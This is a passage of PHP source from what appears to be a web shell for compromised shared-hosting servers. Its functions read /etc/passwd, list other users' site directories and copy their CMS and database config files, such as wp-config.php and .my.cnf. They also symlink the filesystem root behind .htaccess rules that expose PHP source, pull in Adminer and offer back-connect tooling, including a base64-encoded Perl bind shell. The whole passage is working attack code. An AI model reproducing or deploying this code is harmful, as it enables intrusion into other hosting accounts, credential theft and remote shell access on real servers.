                    <button type='submit' name='start' class='btn btn-pink btn-block' style='border-radius:50px;'><i class='fas fa-trash'></i> Start Mass Delete</button>
                </form>
            </div>
        </div>";
    }
    exit;
}
function aksiJump($dir, $file, $ip) {
    $i = 0;
    echo "<div class='card shadow-lg border-0' style='border-radius:20px;'>";
    if (preg_match('/hsphere/', $dir)) {
        $urls = explode("\r\n", $_POST['url']);
        if (isset($_POST['jump'])) {
            echo '<pre style="border-radius:20px; padding:15px; background:#fff; color:#333;">';
            foreach ($urls as $url) {
                $url = str_replace(['http://', 'www.'], '', strtolower($url));
                $etc = '/etc/passwd';
                $f = fopen($etc, 'r');
                while ($gets = fgets($f)) {
                    $pecah = explode(':', $gets);
                    $user = $pecah[0];
                    $dir_user = "/hsphere/local/home/$user";
                    if (is_dir($dir_user) === true) {
                        $url_user = $dir_user.'/'.$url;
                        if (is_readable($url_user)) {
                            $i++;
                            $jrw = "[<span style='color:#4caf50;'>R</span>] <a href='?dir=$url_user' style='color:#ec407a;'>$url_user</a>";
                            if (is_writable($url_user)) {
                                $jrw = "[<span style='color:#4caf50;'>RW</span>] <a href='?dir=$url_user' style='color:#ec407a;'>$url_user</a>";
                            }
                            echo $jrw.'<br>';
                        }
                    }
                }
            }
            if (!$i == 0) {
                echo "<br>Total $i directories found on $ip";
            }
            echo '</pre>';
        } else {
            echo '<div class="card-body">
                <h5 style="color:#ec407a;"><i class="fas fa-search"></i> Jumping Tool</h5>
                <form method="post">
                    <div class="form-group">
                        <label>List Domains:</label>
                        <textarea name="url" class="form-control" rows="10" style="border-radius:20px;">';
            $fp = fopen('/hsphere/local/config/httpd/sites/sites.txt', 'r');
            while ($getss = fgets($fp)) {
                echo $getss;
            }
            echo  '</textarea>
                    </div>
                    <button type="submit" value="Jumping" name="jump" class="btn btn-pink btn-block" style="border-radius:50px;"><i class="fas fa-search"></i> Jump</button>
                </form>
            </div>';
        }
    } elseif (preg_match('/vhosts/', $dir)) {
        $urls = explode("\r\n", $_POST['url']);
        if (isset($_POST['jump'])) {
            echo '<pre style="border-radius:20px; padding:15px; background:#fff; color:#333;">';
            foreach ($urls as $url) {
                $web_vh = "/var/www/vhosts/$url/httpdocs";
                if (is_dir($web_vh) === true) {
                    if (is_readable($web_vh)) {
                        $i++;
                        $jrw = "[<span style='color:#4caf50;'>R</span>] <a href='?dir=$web_vh' style='color:#ec407a;'>$web_vh</a>";
                        if (is_writable($web_vh)) {
                            $jrw = "[<span style='color:#4caf50;'>RW</span>] <a href='?dir=$web_vh' style='color:#ec407a;'>$web_vh</a>";
                        }
                        echo $jrw.'<br>';
                    }
                }
            }
            if (!$i == 0) {
                echo "<br>Total $i directories found on $ip";
            }
            echo '</pre>';
        } else {
            echo '<div class="card-body">
                <h5 style="color:#ec407a;"><i class="fas fa-search"></i> Jumping Tool</h5>
                <form method="post">
                    <div class="form-group">
                        <label>List Domains:</label>
                        <textarea name="url" class="form-control" rows="10" style="border-radius:20px;">';
            bing("ip:$ip");
            echo '</textarea>
                    </div>
                    <button type="submit" value="Jumping" name="jump" class="btn btn-pink btn-block" style="border-radius:50px;"><i class="fas fa-search"></i> Jump</button>
                </form>
            </div>';
        }
    } else {
        echo '<div class="card-body">';
        echo '<pre style="border-radius:20px; padding:15px; background:#fff; color:#333; overflow-x:auto;">';
        $etc = fopen('/etc/passwd', 'r') or die("<span style='color:#e91e63;'>Cannot read /etc/passwd</span>");
        while ($passwd = fgets($etc)) {
            if ($passwd == '' || !$etc) {
                echo "<span style='color:#e91e63;'>Cannot read /etc/passwd</span>";
            } else {
                preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
                foreach ($user_jumping[1] as $user_pro_jump) {
                    $user_jumping_dir = "/home/$user_pro_jump/public_html";
                    if (is_readable($user_jumping_dir)) {
                        $i++;
                        $jrw = "[<span style='color:#4caf50;'>R</span>] <a href='?dir=$user_jumping_dir' style='color:#ec407a;'>$user_jumping_dir</a>";
                        if (is_writable($user_jumping_dir)) {
                            $jrw = "[<span style='color:#4caf50;'>RW</span>] <a href='?dir=$user_jumping_dir' style='color:#ec407a;'>$user_jumping_dir</a>";
                        }
                        echo $jrw;
                        if (function_exists('posix_getpwuid')) {
                            $domain_jump = file_get_contents('/etc/named.conf');
                            if ($domain_jump == '') {
                                echo ' => ( <span style="color:#e91e63;">cannot get domain</span> )<br>';
                            } else {
                                preg_match_all('#/var/named/(.*?).db#', $domain_jump, $domains_jump);
                                foreach ($domains_jump[1] as $dj) {
                                    $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                    $user_jumping_url = $user_jumping_url['name'];
                                    if ($user_jumping_url == $user_pro_jump) {
                                        echo " => ( <u>$dj</u> )<br>";
                                        break;
                                    }
                                }
                            }
                        } else {
                            echo '<br>';
                        }
                    }
                }
            }
        }
        if (!$i == 0) {
            echo "<br>Total $i directories found on $ip";
        }
        echo '</pre>';
        echo '</div>';
    }
    echo '</div>';
    exit;
}
function aksiConfig($dir, $file) {
    if ($_POST) {
        $passwd = $_POST['passwd'];
        mkdir('pororo_config', 0777);
        $isi_htc = 'Options allnRequire NonenSatisfy Any';
        $htc = fopen('pororo_config/.htaccess', 'w');
        fwrite($htc, $isi_htc);
        preg_match_all('/(.*?):x:/', $passwd, $user_config);
        foreach ($user_config[1] as $user_con) {
            $user_config_dir = "/home/$user_con/public_html/";
            if (is_readable($user_config_dir)) {
                $grab_config = [
                    "/home/$user_con/.my.cnf" => 'cpanel',
                    "/home/$user_con/public_html/config/koneksi.php" => 'Lokomedia',
                    "/home/$user_con/public_html/forum/config.php" => 'phpBB',
                    "/home/$user_con/public_html/sites/default/settings.php" => 'Drupal',
                    "/home/$user_con/public_html/config/settings.inc.php" => 'PrestaShop',
                    "/home/$user_con/public_html/app/etc/local.xml" => 'Magento',
                    "/home/$user_con/public_html/admin/config.php" => 'OpenCart',
                    "/home/$user_con/public_html/application/config/database.php" => 'Ellislab',
                    "/home/$user_con/public_html/vb/includes/config.php" => 'Vbulletin',
                    "/home/$user_con/public_html/includes/config.php" => 'Vbulletin',
                    "/home/$user_con/public_html/forum/includes/config.php" => 'Vbulletin',
                    "/home/$user_con/public_html/forums/includes/config.php" => 'Vbulletin',
                    "/home/$user_con/public_html/cc/includes/config.php" => 'Vbulletin',
                    "/home/$user_con/public_html/inc/config.php" => 'MyBB',
                    "/home/$user_con/public_html/includes/configure.php" => 'OsCommerce',
                    "/home/$user_con/public_html/shop/includes/configure.php" => 'OsCommerce',
                    "/home/$user_con/public_html/os/includes/configure.php" => 'OsCommerce',
                    "/home/$user_con/public_html/oscom/includes/configure.php" => 'OsCommerce',
                    "/home/$user_con/public_html/products/includes/configure.php" => 'OsCommerce',
                    "/home/$user_con/public_html/cart/includes/configure.php" => 'OsCommerce',
                    "/home/$user_con/public_html/inc/conf_global.php" => 'IPB',
                    "/home/$user_con/public_html/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/wp/test/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/blog/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/beta/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/portal/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/site/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/wp/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/WP/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/news/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/wordpress/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/test/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/demo/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/home/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/v1/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/v2/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/press/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/new/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/blogs/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/blog/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/cms/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/beta/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/portal/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/site/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/main/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/home/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/demo/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/test/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/v1/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/v2/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/joomla/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/new/configuration.php" => 'Joomla',
                ];
                foreach ($grab_config as $config => $nama_config) {
                    $ambil_config = file_get_contents($config);
                    if ($ambil_config == '') {
                    } else {
                        $file_config = fopen("pororo_config/$user_con-$nama_config.txt", 'w');
                        fwrite($file_config, $ambil_config);
                    }
                }
            }
        }
        echo "<div class='alert alert-success'>Successfully grabbed configs!</div>
        <a href='?dir=$dir/pororo_config' class='btn btn-pink btn-block' style='border-radius:50px;'><i class='fas fa-folder-open'></i> View Configs</a>";
    } else {
        echo "<div class='card shadow-lg border-0' style='border-radius:20px;'>
            <div class='card-body'>
                <h5 style='color:#ec407a;'><i class='fas fa-database'></i> Config Grabber</h5>
                <form method='post'>
                    <p class='text-muted'>/etc/passwd error? <a href='?dir=$dir&aksi=passwbypass' style='color:#ec407a;'>Bypass here</a></p>
                    <textarea name='passwd' class='form-control' rows='13' style='border-radius:20px; font-family:monospace;'>".file_get_contents('/etc/passwd')."</textarea>
                    <button type='submit' class='btn btn-pink btn-block mt-3' style='border-radius:50px;'><i class='fas fa-download'></i> Grab Configs</button>
                </form>
            </div>
        </div>";
    }
    exit;
}
function aksiBypasswd($dir, $file) {
    echo '<div class="card shadow-lg border-0" style="border-radius:20px;">
        <div class="card-body">
            <h5 style="color:#ec407a;"><i class="fas fa-unlock-alt"></i> Bypass /etc/passwd</h5>
            <form method="POST">
                <p class="text-center">Bypass /etc/passwd with:</p>
                <div class="d-flex justify-content-center flex-wrap mb-4">
                    <button type="submit" class="btn btn-outline-pink btn-sm m-1" name="syst">System</button>
                    <button type="submit" class="btn btn-outline-pink btn-sm m-1" name="passth">Passthru</button>
                    <button type="submit" class="btn btn-outline-pink btn-sm m-1" name="ex">Exec</button>
                    <button type="submit" class="btn btn-outline-pink btn-sm m-1" name="shex">Shell_exec</button>
                    <button type="submit" class="btn btn-outline-pink btn-sm m-1" name="melex">Posix_getpwuid</button>
                </div>
                <p class="text-center">Bypass User with:</p>
                <div class="d-flex justify-content-center flex-wrap">
                    <button type="submit" class="btn btn-outline-pink btn-sm m-1" name="awkuser">Awk</button>
                    <button type="submit" class="btn btn-outline-pink btn-sm m-1" name="systuser">System</button>
                    <button type="submit" class="btn btn-outline-pink btn-sm m-1" name="passthuser">Passthru</button>    
                    <button type="submit" class="btn btn-outline-pink btn-sm m-1" name="exuser">Exec</button>        
                    <button type="submit" class="btn btn-outline-pink btn-sm m-1" name="shexuser">Shell_exec</button>
                </div>
            </form>';
    $mail = 'ls /var/mail';
    $paswd = '/etc/passwd';
    if ($_POST['syst']) {
        echo"<textarea class='form-control mt-3' rows='10' style='border-radius:20px; font-family:monospace;' readonly>";
        echo system("cat $paswd");
        echo'</textarea>';
    }
    if ($_POST['passth']) {
        echo"<textarea class='form-control mt-3' rows='10' style='border-radius:20px; font-family:monospace;' readonly>";
        echo passthru("cat $paswd");
        echo'</textarea>';
    }
    if ($_POST['ex']) {
        echo"<textarea class='form-control mt-3' rows='10' style='border-radius:20px; font-family:monospace;' readonly>";
        echo exec("cat $paswd");
        echo'</textarea>';
    }
    if ($_POST['shex']) {
        echo"<textarea class='form-control mt-3' rows='10' style='border-radius:20px; font-family:monospace;' readonly>";
        echo shell_exec("cat $paswd");
        echo'</textarea>';
    }
    if ($_POST['melex']) {
        echo"<textarea class='form-control mt-3' rows='10' style='border-radius:20px; font-family:monospace;' readonly>";
        for ($uid = 0; $uid < 6000; $uid++) {
            $ara = posix_getpwuid($uid);
            if (!empty($ara)) {
                while (list($key, $val) = each($ara)) {
                    echo "$val:";
                }
                echo "\n";
            }
        }
        echo'</textarea>';
    }

    if ($_POST['awkuser']) {
        echo"<textarea class='form-control mt-3' rows='10' style='border-radius:20px; font-family:monospace;' readonly>
                ".shell_exec("awk -F: '{ print $1 }' $paswd | sort").'
            </textarea>';
    }
    if ($_POST['systuser']) {
        echo"<textarea class='form-control mt-3' rows='10' style='border-radius:20px; font-family:monospace;' readonly>";
        echo system("$mail");
        echo '</textarea>';
    }
    if ($_POST['passthuser']) {
        echo"<textarea class='form-control mt-3' rows='10' style='border-radius:20px; font-family:monospace;' readonly>";
        echo passthru("$mail");
        echo '</textarea>';
    }
    if ($_POST['exuser']) {
        echo"<textarea class='form-control mt-3' rows='10' style='border-radius:20px; font-family:monospace;' readonly>";
        echo exec("$mail");
        echo '</textarea>';
    }
    if ($_POST['shexuser']) {
        echo"<textarea class='form-control mt-3' rows='10' style='border-radius:20px; font-family:monospace;' readonly>";
        echo shell_exec("$mail");
        echo '</textarea>';
    }
    echo '</div></div>';
    exit;
}
function aksiAdminer($dir, $file) {
    $full = str_replace($_SERVER['DOCUMENT_ROOT'], '', $dir);
    function adminer($url, $isi) {
        $fp = fopen($isi, 'w');
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FILE, $fp);

        return curl_exec($ch);
        curl_close($ch);
        fclose($fp);
        ob_flush();
        flush();
    }
    echo "<div class='card shadow-lg border-0 text-center' style='border-radius:20px;'>
        <div class='card-body'>";
    if (file_exists('adminer.php')) {
        echo "<a href='$full/adminer.php' target='_blank' class='btn btn-pink btn-block' style='border-radius:50px;'><i class='fas fa-database'></i> Open Adminer</a>";
    } else {
        if (adminer('https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php', 'adminer.php')) {
            echo "<div class='alert alert-success'>Adminer created successfully!</div>
            <a href='$full/adminer.php' target='_blank' class='btn btn-pink btn-block' style='border-radius:50px;'><i class='fas fa-database'></i> Open Adminer</a>";
        } else {
            echo "<div class='alert alert-danger'>Failed to create Adminer</div>";
        }
    }
    echo "</div></div>";
    exit;
}
function aksiSym($dir, $file) {
    $full = str_replace($_SERVER['DOCUMENT_ROOT'], '', $dir);
    $d0mains = @file('/etc/named.conf');
    if (!$d0mains) {
        echo "<div class='alert alert-danger'>Cannot read /etc/named.conf</div>";
        echo "<div class='btn-group mb-3'>
            <a href='?dir=$dir&aksi=symread' class='btn btn-outline-pink'>Bypass Read</a>
            <a href='?dir=$dir&aksi=sym_404' class='btn btn-outline-pink'>Symlink 404</a>
            <a href='?dir=$dir&aksi=sym_bypas' class='btn btn-outline-pink'>Symlink Bypass</a>
        </div>";
        return;
    }
    if ($d0mains) {
        @mkdir('pororo_sym', 0777);
        @chdir('pororo_sym');
        @exe('ln -s / root');
        $file3 = 'Options Indexes FollowSymLinks
        DirectoryIndex indsc.html
        AddType text/plain php html php5 phtml
        AddHandler text/plain php html php5 phtml
        Satisfy Any';
        $fp3 = fopen('.htaccess', 'w');
        $fw3 = fwrite($fp3, $file3);
        @fclose($fp3);
        echo "<div class='btn-group mb-3'>
            <a href='?dir=$dir&aksi=symread' class='btn btn-outline-pink'>Bypass Read</a>
            <a href='?dir=$dir&aksi=sym_404' class='btn btn-outline-pink'>Symlink 404</a>
            <a href='?dir=$dir&aksi=sym_bypas' class='btn btn-outline-pink'>Symlink Bypass</a>
        </div>";
        echo "<div class='card shadow-lg border-0' style='border-radius:20px; overflow-x:auto;'>
            <table class='table table-hover mb-0'>
                <thead style='background:#ec407a; color:white;'>
                    <tr>
                        <th>No.</th>
                        <th>Domains</th>
                        <th>Users</th>
                        <th>Symlink</th>
                    </tr>
                </thead>
                <tbody>";
        $dcount = 1;
        foreach ($d0mains as $d0main) {
            if (eregi('zone', $d0main)) {
                preg_match_all('#zone "(.*)"#', $d0main, $domains);
                flush();
                if (strlen(trim($domains[1][0])) > 2) {
                    $user = posix_getpwuid(@fileowner('/etc/valiases/'.$domains[1][0]));
                    echo "<tr>
                            <td>".$dcount."</td>
                            <td class='text-left'><a href='http://www.".$domains[1][0]."/' target='_blank'>".$domains[1][0]."</a></td>
                            <td>".$user['name']."</td>
                            <td><a href='$full/pororo_sym/root/home/".$user['name']."/public_html' target='_blank' class='btn btn-sm btn-pink'>Symlink</a></td>
                        </tr>";
                    flush();
                    $dcount++;
                }
            }
        }
        echo "</tbody></table></div>";
    } else {
        $TEST = @file('/etc/passwd');
        if ($TEST) {
            @mkdir('pororo_sym', 0777);
            @chdir('pororo_sym');
            @exe('ln -s / root');
            $file3 = 'Options Indexes FollowSymLinks
            DirectoryIndex indsc.html
            AddType text/plain php html php5 phtml
            AddHandler text/plain php html php5 phtml
            Satisfy Any';
            $fp3 = fopen('.htaccess', 'w');
            $fw3 = fwrite($fp3, $file3);
            @fclose($fp3);
            echo "<div class='btn-group mb-3'>
                <a href='?dir=$dir&aksi=symread' class='btn btn-outline-pink'>Bypass Read</a>
                <a href='?dir=$dir&aksi=sym_404' class='btn btn-outline-pink'>Symlink 404</a>
                <a href='?dir=$dir&aksi=sym_bypas' class='btn btn-outline-pink'>Symlink Bypass</a>
            </div>";
            echo "<div class='card shadow-lg border-0' style='border-radius:20px; overflow-x:auto;'>
                <table class='table table-hover mb-0'>
                    <thead style='background:#ff9800; color:white;'>
                        <tr>
                            <th>No.</th>
                            <th>Users</th>
                            <th>Symlink</th>
                        </tr>
                    </thead>
                    <tbody>";
            $dcount = 1;
            $file = fopen('/etc/passwd', 'r') or exit('Unable to open file!');
            while (!feof($file)) {
                $s = fgets($file);
                $matches = [];
                $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
                $matches = str_replace('home/', '', $matches[1]);
                if (strlen($matches) > 12 || strlen($matches) == 0 || $matches == 'bin' || $matches == 'etc/X11/fs' || $matches == 'var/lib/nfs' || $matches == 'var/arpwatch' || $matches == 'var/gopher' || $matches == 'sbin' || $matches == 'var/adm' || $matches == 'usr/games' || $matches == 'var/ftp' || $matches == 'etc/ntp' || $matches == 'var/www' || $matches == 'var/named') {
                    continue;
                }
                echo "<tr>
                        <td>".$dcount."</td>
                        <td>".$matches."</td>
                        <td><a href='$full/pororo_sym/root/home/".$matches."/public_html' target='_blank' class='btn btn-sm btn-pink'>Symlink</a></td>
                    </tr>";
                $dcount++;
            }
            fclose($file);
            echo "</tbody></table></div>";
        } else {
            $os = explode(' ', php_uname());
            if ($os[0] != 'Windows') {
                @mkdir('pororo_sym', 0777);
                @chdir('pororo_sym');
                @exe('ln -s / root');
                $file3 = 'Options Indexes FollowSymLinks
            DirectoryIndex indsc.html
            AddType text/plain php html php5 phtml
            AddHandler text/plain php html php5 phtml
            Satisfy Any';
                $fp3 = fopen('.htaccess', 'w');
                $fw3 = fwrite($fp3, $file3);
                @fclose($fp3);
                echo "<div class='btn-group mb-3'>
                    <a href='?dir=$dir&aksi=symread' class='btn btn-outline-pink'>Bypass Read</a>
                    <a href='?dir=$dir&aksi=sym_404' class='btn btn-outline-pink'>Symlink 404</a>
                    <a href='?dir=$dir&aksi=sym_bypas' class='btn btn-outline-pink'>Symlink Bypass</a>
                </div>";
                echo "<div class='card shadow-lg border-0' style='border-radius:20px; overflow-x:auto;'>
                    <table class='table table-hover mb-0'>
                        <thead style='background:#f44336; color:white;'>
                            <tr>
                                <th>ID.</th>
                                <th>Users</th>
                                <th>Symlink</th>
                            </tr>
                        </thead>
                        <tbody>";
                $temp = '';
                $val1 = 0;
                $val2 = 1000;
                for (; $val1 <= $val2; $val1++) {
                    $uid = @posix_getpwuid($val1);
                    if ($uid) {
                        $temp .= implode(':', $uid)."\n";
                    }
                }
                echo '<br/>';
                $temp = trim($temp);
                $file5 = fopen('test.txt', 'w');
                fwrite($file5, $temp);
                fclose($file5);
                $dcount = 1;
                $file =
                fopen('test.txt', 'r') or exit('Unable to open file!');
                while (!feof($file)) {
                    $s = fgets($file);
                    $matches = [];
                    $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
                    $matches = str_replace('home/', '', $matches[1]);
                    if (strlen($matches) > 12 || strlen($matches) == 0 || $matches == 'bin' || $matches == 'etc/X11/fs' || $matches == 'var/lib/nfs' || $matches == 'var/arpwatch' || $matches == 'var/gopher' || $matches == 'sbin' || $matches == 'var/adm' || $matches == 'usr/games' || $matches == 'var/ftp' || $matches == 'etc/ntp' || $matches == 'var/www' || $matches == 'var/named') {
                        continue;
                    }
                    echo "<tr>
                            <td>".$dcount."</td>
                            <td>".$matches."</td>
                            <td><a href='$full/pororo_sym/root/home/".$matches."/public_html' target='_blank' class='btn btn-sm btn-pink'>Symlink</a></td>
                        </tr>";
                    $dcount++;
                }
                fclose($file);
                echo "</tbody></table></div>";
                unlink('test.txt');
            }
        }
    }
    exit;
}
function aksiSymread($dir, $file) {
    echo "<div class='card shadow-lg border-0' style='border-radius:20px;'>
        <div class='card-body'>
            <h5 style='color:#ec407a;'>Read /etc/named.conf</h5>
            <form method='post' action='?dir=$dir&aksi=symread&save=1'>
                <textarea class='form-control' rows='13' name='file' style='border-radius:20px; font-family:monospace;'>";
    flush();
    flush();
    $file = '/etc/named.conf';
    $r3ad = @fopen($file, 'r');
    if ($r3ad) {
        $content = @fread($r3ad, @filesize($file));
        echo ''.htmlentities($content).'';
    } elseif (!$r3ad) {
        $r3ad = @highlight_file($file);
    } elseif (!$r3ad) {
        $r3ad = @highlight_file($file);
    } elseif (!$r3ad) {
        $sm = @symlink($file, 'sym.txt');
        if ($sm) {
            $r3ad = @fopen('pororo_sym/sym.txt', 'r');
            $content = @fread($r3ad, @filesize($file));
            echo ''.htmlentities($content).'';
        }
    }
    echo "</textarea>
                <button type='submit' class='btn btn-pink btn-block mt-3' style='border-radius:50px;'><i class='fas fa-save'></i> Save</button>
            </form>";
    if (isset($_GET['save'])) {
        $cont = stripcslashes($_POST['file']);
        $f = fopen('named.txt', 'w');
        $w = fwrite($f, $cont);
        if ($w) {
            echo '<div class="alert alert-success mt-3">Save successful!</div>';
        }
        fclose($f);
    }
    echo "</div></div>";
    exit;
}
function sym404($dir, $file) {
    $cp = get_current_user();
    if ($_POST['execute']) {
        @rmdir('pororo_sym404');
        @mkdir('pororo_sym404', 0777);
        $dir = $_POST['dir'];
        $isi = $_POST['isi'];
        @system('ln -s '.$dir.'pororo_sym404/'.$isi);
        @symlink($dir, 'pororo_sym404/'.$isi);
        $inija = fopen('pororo_sym404/.htaccess', 'w');
        @fwrite($inija, 'ReadmeName '.$isi."\nOptions Indexes FollowSymLinks\nDirectoryIndex ids.html\nAddType text/plain php html php5 phtml\nAddHandler text/plain php html php5 phtml\nSatisfy Any");
        echo '<a href="/pororo_sym404/" target="_blank" class="btn btn-pink btn-block" style="border-radius:50px;"><i class="fas fa-link"></i> Open Symlink</a>';
    } else {
        echo "<div class='card shadow-lg border-0' style='border-radius:20px;'>
            <div class='card-body'>
                <h5 style='color:#ec407a;'>Symlink 404</h5>
                <form method='post'>
                    <div class='form-group'>
                        <label>Target File:</label>
                        <input type='text' class='form-control' name='dir' value='/home/".$cp."/public_html/wp-config.php' style='border-radius:50px;'>
                    </div>
                    <div class='form-group'>
                        <label>Save As:</label>
                        <input type='text' class='form-control' name='isi' placeholder='e.g., file.txt' style='border-radius:50px;'>
                    </div>
                    <button type='submit' class='btn btn-pink btn-block' name='execute' style='border-radius:50px;'><i class='fas fa-play'></i> Execute</button>
                    <small class='text-muted d-block mt-3'>Note: wp-config location may vary, adjust accordingly.</small>
                </form>
            </div>
        </div>";
    }
    exit;
}
function symBypass($dir, $file) {
    $full = str_replace($_SERVER['DOCUMENT_ROOT'], '', $dir);
    $pageFTP = 'ftp://'.$_SERVER['SERVER_NAME'].'/public_html/'.$_SERVER['REQUEST_URI'];
    $u = explode('/', $pageFTP);
    $pageFTP = str_replace($u[count($u) - 1], '', $pageFTP);
    if (isset($_GET['save']) and isset($_POST['file']) or @filesize('passwd.txt') > 0) {
        $cont = stripcslashes($_POST['file']);
        if (!file_exists('passwd.txt')) {
            $f = @fopen('passwd.txt', 'w');
            $w = @fwrite($f, $cont);
            fclose($f);
        }
        if ($w or @filesize('passwd.txt') > 0) {
            echo "<div class='card shadow-lg border-0' style='border-radius:20px; overflow-x:auto;'>
                <table class='table table-hover mb-0'>
                    <thead style='background:#ec407a; color:white;'>
                        <tr>
                            <th>Users</th>
                            <th>Symlink</th>
                            <th>FTP</th>
                        </tr>
                    </thead>
                    <tbody>";
            flush();
            $fil3 = file('passwd.txt');
            foreach ($fil3 as $f) {
                $u = explode(':', $f);
                $user = $u['0'];
                echo "<tr>
                        <td>$user</td>
                        <td><a href='$full/sym/root/home/$user/public_html' target='_blank' class='btn btn-sm btn-pink'>Symlink</a></td>
                        <td><a href='$pageFTP/sym/root/home/$user/public_html' target='_blank' class='btn btn-sm btn-info'>FTP</a></td>
                    </tr>";
                flush();
                flush();
            }
            echo "</tbody></table></div>";
            die();
        }
    }
    echo "<div class='card shadow-lg border-0' style='border-radius:20px;'>
        <div class='card-body'>
            <h5 style='color:#ec407a;'>Symlink Bypass</h5>
            <p>Read /etc/passwd <span style='color:#e91e63;'>error?</span> <a href='?dir=".$dir."&aksi=passwbypass' style='color:#ec407a;'>Bypass Here</a></p>
            <form method='post' action='?dir=$dir&aksi=sym_bypas&save=1'>
                <textarea class='form-control' rows='13' name='file' style='border-radius:20px; font-family:monospace;'>";
    flush();
    $file = '/etc/passwd';
    $r3ad = @fopen($file, 'r');
    if ($r3ad) {
        $content = @fread($r3ad, @filesize($file));
        echo ''.htmlentities($content).'';
    } elseif (!$r3ad) {
        $r3ad = @highlight_file($file);
    } elseif (!$r3ad) {
        $r3ad = @highlight_file($file);
    } elseif (!$r3ad) {
        for ($uid = 0; $uid < 1000; $uid++) {
            $ara = posix_getpwuid($uid);
            if (!empty($ara)) {
                while (list($key, $val) = each($ara)) {
                    echo "$val:";
                }
                echo "\n";
            }
        }
    }
    flush();
    echo "</textarea>
                <button type='submit' class='btn btn-pink btn-block mt-3' style='border-radius:50px;'><i class='fas fa-link'></i> Create Symlink</button>
            </form>
        </div>
    </div>";
    flush();
    exit;
}
function bcTool($dir, $file) {
    echo "<div class='card shadow-lg border-0' style='border-radius:20px;'>
        <div class='card-body'>
            <h5 style='color:#ec407a;' class='text-center mb-4'><i class='fas fa-network-wired'></i> Back Connect Tools</h5>
            <form method='post'>
                <div class='row'>
                    <div class='col-md-12'>
                        <div class='form-group'>
                            <label>Bind Port (Perl):</label>
                            <div class='input-group'>
                                <input type='text' name='port' class='form-control' value='6969' style='border-radius:50px 0 0 50px;'>
                                <button type='submit' name='bpl' class='btn btn-pink' style='border-radius:0 50px 50px 0;'><i class='fas fa-plug'></i> Bind</button>
                            </div>
                        </div>
                        <h5 class='mt-4'>Back-Connect</h5>
                        <div class='form-group'>
                            <label>Server IP:</label>
                            <input type='text' name='server' class='form-control' placeholder='".$_SERVER['REMOTE_ADDR']."' style='border-radius:50px;'>
                        </div>
                        <div class='form-group'>
                            <label>Port:</label>
                            <div class='input-group'>
                                <input type='text' name='port' class='form-control' placeholder='443' style='border-radius:50px 0 0 50px;'>
                                <select class='form-control' name='backconnect' style='border-radius:0 50px 50px 0; width:auto;'>
                                    <option value='perl'>Perl</option>
                                    <option value='php'>PHP</option>
                                    <option value='python'>Python</option>
                                    <option value='ruby'>Ruby</option>
                                </select>
                            </div>
                        </div>
                        <button type='submit' class='btn btn-pink btn-block' style='border-radius:50px;'><i class='fas fa-plug'></i> Connect</button>
                    </div>
                </div>
            </form>";
    if ($_POST['bpl']) {
        $bp = base64_decode('IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=');
